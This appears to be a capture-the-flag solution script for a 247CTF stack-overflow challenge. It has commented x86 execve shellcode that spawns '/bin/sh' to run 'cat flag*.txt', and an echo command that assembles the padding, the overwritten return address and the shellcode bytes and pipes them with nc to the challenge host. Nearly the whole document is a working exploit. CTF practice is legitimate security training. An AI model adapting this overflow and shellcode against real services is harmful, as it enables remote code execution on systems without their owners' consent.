# ASM Bounce Address: 0x080484a6 #
# Solution: Inject payload to open '/bin/sh' and run the command 'cat flag*.txt' through stack overflow exploit #
# OBS: I figured the flag name wasn't 'flag.txt' by running 'ls' first #
# Bytes to overwrite until executable stack: 136 #
# Bytes to overwrite until return address: 4 #
# ========================= #
# PRE-PAYLOAD:              #
#  JMP EIP+0x20             # # Payload Address                               #
# PAYLOAD:                  #
#  NOP                      #
#  NOP                      #
#  NOP                      #
#  NOP                      #
#  LEA ESI, [ESP+4]         # # Save current stack pointer                    #
#  LEA ESP, [ESP-136]       # # Place stack pointer away to avoid overwriting #
#  MOV EAX, 11              # # 'execve' syscall number                       #
#  LEA EBX, [ESI]           # # '/bin/sh' string                              #
#  PUSH 0x0                 # # NULL pointer for 'args'                       #
#  LEA ECX, [ESI+14]        # # 'cat flag*.txt' string                        #
#  PUSH ECX                 #
#  LEA ECX, [ESI+11]        # # '-c' string                                   #
#  PUSH ECX                 #
#  LEA ECX, [ESI+8]         # # 'sh' string                                   #
#  PUSH ECX                 #
#  LEA ECX, [ESP]           # # pointer to array of strings (args)            #
#  MOV EDX, 0x0             # # NULL pointer for 'envp'                       #
#  INT 0x80                 # # SYSCALL                                       #
#  MOV EAX, 0x1             # # 'exit' syscall number                         #
#  MOV EBX, 0x69            # # exit code for 'exit'                          #
#  INT 0x80                 # # SYSCALL                                       #
# ========================= #

echo -ne \
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"\x00\x90\x90\xEB\x20"\
"\xa6\x84\x04\x08"\
"/bin/sh\x00"\
"sh\x00"\
"-c\x00"\
"cat flag*.txt\x00"\
"\x90\x90\x90\x90"\
"\x8D\x74\x24\x04"\
"\x8D\xA4\x24\x78\xFF\xFF\xFF"\
"\xB8\x0B\x00\x00\x00"\
"\x8D\x1E"\
"\x6A\x00"\
"\x8D\x4E\x0E"\
"\x51"\
"\x8D\x4E\x0B"\
"\x51"\
"\x8D\x4E\x08"\
"\x51"\
"\x8D\x0C\x24"\
"\xBA\x00\x00\x00\x00"\
"\xCD\x80"\
"\xB8\x01\x00\x00\x00"\
"\xBB\x69\x00\x00\x00"\
"\xCD\x80"\
"\n" | nc e9abcef4ae91db5e.247ctf.com 50381
